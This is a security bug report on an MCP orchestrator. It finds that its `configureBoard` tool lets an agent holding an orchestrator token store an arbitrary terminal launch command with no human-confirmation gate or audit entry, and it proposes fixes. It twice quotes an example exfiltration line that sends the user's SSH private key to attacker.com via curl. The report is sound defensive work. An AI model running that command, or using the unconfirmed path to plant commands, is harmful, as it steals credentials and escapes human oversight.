# BUG-002: MCP `configureBoard` sets `launchCommand` with no human-confirm gate → arbitrary shell command on spawn

- **Severity:** High
- **Category:** security
- **Status:** CONFIRMED (adversarially verified)
- **Files touched:** `src/main/mcpOrchestrator.ts`
- **Roadmap:** partial — docs/roadmap-mcp.md + T3.3, T4.2
- **Collides with:** BUG-008, BUG-009, BUG-020, BUG-021
- **Target tree:** `origin/main` (line numbers as of `integration/mcp-on-main`@bc236ee, `src/` identical to origin/main)
- **Assigned:** _(unassigned)_

## Summary
`configureBoard` (line 276-283) sends a `{ type: 'configureBoard', id, patch: { shell?, launchCommand?, cwd? } }` command directly to the renderer with no human-confirmation step. `launchCommand` is free-text that will be written as the first PTY line on the next spawn. An MCP client with orchestrator-tier token can therefore pre-configure any terminal board to run an arbitrary command on its next spawn (e.g. `exfil-tool --key=...\r`) without any human gate. This bypasses the entire T4.2 confirm architecture.

## Where
`src/main/mcpOrchestrator.ts:292`

## How it triggers
An MCP client calls `configure_board` with `launchCommand: 'curl http://attacker.com/$(cat ~/.ssh/id_rsa)'`. The next time the board is spawned (e.g. on app restart, board restart, or a new session), that command runs in the PTY immediately as the first line — no confirmation shown, no audit trail for the write itself.

## Verification evidence
Concrete code-path argument:

1. `src/main/mcpOrchestrator.ts` lines 276–283: `configureBoard` receives free-text `launchCommand` and issues `registry.sendCommand({ type: 'configureBoard', id: boardId, patch: config })` with zero sanitization, no human confirmation dialog (`registry.confirm`), no nonce/guard, and no audit log entry.

2. `src/renderer/src/store/useMcpCommands.ts` line 60: the command handler calls `useCanvasStore.getState().updateBoard(command.id, command.patch)`, which persists `launchCommand` on the board state (filtered only by `PATCHABLE_KEYS`, which explicitly includes `launchCommand` for terminal boards — `canvasStore.ts` line 317).

3. `src/main/pty.ts` lines 533–534: `const launch = opts.launchCommand?.trim(); if (launch) proc.write(launch + '\r')` — on next PTY spawn the stored value is written verbatim as the first shell line.

4. Contrast with `handoffPrompt` (lines 285–400): that path applies `sanitizeDispatchText`, mints a single-use nonce via `guard.issue()`, blocks on `registry.confirm(...)` (human-approval dialog), redeems the nonce before write, and writes two `registry.audit(...)` entries. `configureBoard` skips ALL four.

5. The tier-split (dist/index.js lines 445–458) restricts `configure_board` to orchestrator-tier tokens only — worker tokens cannot call it. This is a meaningful but insufficient boundary: the orchestrator token is the primary credential handed to the first agent via `.mcp.json`, so any MCP client holding it can silently pre-set `launchCommand: 'curl http://attacker.com/$(cat ~/.ssh/id_rsa)'` on any terminal board; the command executes automatically on the next spawn (app restart, board re-spawn) with no dialog shown to the user and no audit trail for the configure write itself.

## Suggested fix direction
Apply the same four protections that `handoffPrompt` uses: (a) run `sanitizeDispatchText` on the `launchCommand` value to reject embedded CR/LF before it is stored; (b) require a `registry.confirm(...)` dialog before persisting a `launchCommand` change (or at minimum before the next PTY spawn that would execute it); (c) write a `registry.audit(...)` entry recording the configure call, the target board id, and the new `launchCommand` value. The nonce/guard may be less critical here since the execution is deferred, but the confirm gate and audit entry are the load-bearing fixes.
